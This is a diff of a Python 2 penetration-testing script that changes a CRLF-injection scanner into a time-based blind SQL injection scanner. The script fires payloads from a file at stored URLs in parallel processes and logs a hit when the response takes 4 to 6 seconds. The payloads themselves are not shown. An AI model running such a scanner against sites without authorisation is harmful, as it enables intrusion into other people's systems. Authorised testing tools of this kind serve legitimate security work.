@@ -7,24 +7,20 @@ import timeit
 import multiprocessing as mp
 
 # save_data의 경우는 함수마다 공격의 결과값을 판단하는 패턴이 다르므로 개별로 정의
-class crlf(ninja.web):
+class sqli(ninja.web):
 
     def save_data(self, method, case, url, payloads, res):
 
         self.collection_saving_results = self.db["report"]
         print res.url
+        print res.elapsed.seconds
 
-        res_content = res.content
-        headers = res.headers
+        if (res.elapsed.seconds > 4.0 and res.elapsed.seconds < 6.0) and res.status_code != 404:
 
-        for header in headers.keys():
-
-            if (header.find("injected") != -1) or (headers[header].find("injected") != -1):
-
-                # case2 and post
-                if payloads:
-                    self.collection_saving_results.insert({"url" : url,
-                                                "attack name" : "crlf injection",
+            # case2 and post
+            if payloads:
+                self.collection_saving_results.insert({"url" : url,
+                                                "attack name" : "sql injection time",
                                                 "method" : method,
                                                 "case" : case,
                                                 "payload" : str(res.url) + str(payloads),
@@ -34,12 +30,13 @@ class crlf(ninja.web):
                                                 "res_content" : str(res.content),
                                                 "res_time" : res.elapsed.total_seconds()
                                                 })
-                    print "[+] [%s][%s] %s?%s" %(case, method, url, payloads)
-                # case1 and get, case2 and get
+                print "[+] [%s][%s] %s?%s" %(case, method, url, payloads)
 
-                else:
-                    self.collection_saving_results.insert({"url" : url,
-                                                "attack name" : "crlf injection",
+            # case1 and get, case2 and get
+            else:
+
+                self.collection_saving_results.insert({"url" : url,
+                                                "attack name" : "sql injection time",
                                                 "method" : method,
                                                 "case" : case,
                                                 "payload" : res.url,
@@ -49,20 +46,20 @@ class crlf(ninja.web):
                                                 "res_content" : str(res.content),
                                                 "res_time" : res.elapsed.total_seconds()
                                                 })
-                    print "[+] [%s][%s] %s" %(case, method, res.url)
+                print "[+] [%s][%s] %s" %(case, method, res.url)
 
 
 if __name__ == "__main__":
 
-    usage        = '''./crlf_injection.py -t '''
+    usage        = '''./sql_injection_time.py -t '''
 
-    parser = argparse.ArgumentParser(description = "crlf injection attack for pen testing", \
+    parser = argparse.ArgumentParser(description = "sql injection attack based on time delay for pen testing", \
                                      usage = usage)
     parser.add_argument("-t", "--table", required=True, help="collection that saved urls")
     parser.add_argument("-p", "--payload", required=True, help="payload characters to attack")
     parser.add_argument("-u", "--url", required=True, help="requests in origin_url")
     parser.add_argument("-c", "--cookie", required=False, help="filename that contains a cookie")
-    parser.add_argument("-o", "--timeout", required=False, help="default timeout is 1 sec")
+    parser.add_argument("-o", "--timeout", required=True, help="default timeout is 1 sec")
     parser.add_argument("-v", "--version", action='version', version = 'JongWon Kim (dikien2012@gmail.com)\n%(prog)s - v.1.1 (05/05/2014)')
 
     args = parser.parse_args()
@@ -74,22 +71,22 @@ if __name__ == "__main__":
     timeout = args.timeout
     start_time = timeit.default_timer()
 
-    crlf = crlf(collection_saving_urls, cookie_filename, attack_strings_filename, timeout, origin_url)
+    sqli = sqli(collection_saving_urls, cookie_filename, attack_strings_filename, timeout, origin_url)
 
     # 공격의 예상시간을 출력
-    crlf.predict_attack_time()
+    sqli.predict_attack_time()
 
     processes = []
 
     # 공격에 필요한 url을 테이블에서 가져옴
-    urls = crlf.search_urls()
+    urls = sqli.search_urls()
 
     for url in urls:
 
         # 윈도우 계열의 경우 아래의 명령어를 실행
-        # process = mp.Process(target = crlf.attack_case1(url))
+        # process = mp.Process(target = sqli.attack_case1(url))
 
-        process = mp.Process(target = crlf.attack_case1, args=(url,))
+        process = mp.Process(target = sqli.attack_case1, args=(url,))
         processes.append(process)
         process.start()
     for item in processes:
@@ -99,7 +96,7 @@ if __name__ == "__main__":
 
 # case 2, 3
     for url in urls:
-        process = mp.Process(target = crlf.attack_case2, args=(url,))
+        process = mp.Process(target = sqli.attack_case2, args=(url,))
         processes.append(process)
         process.start()
 
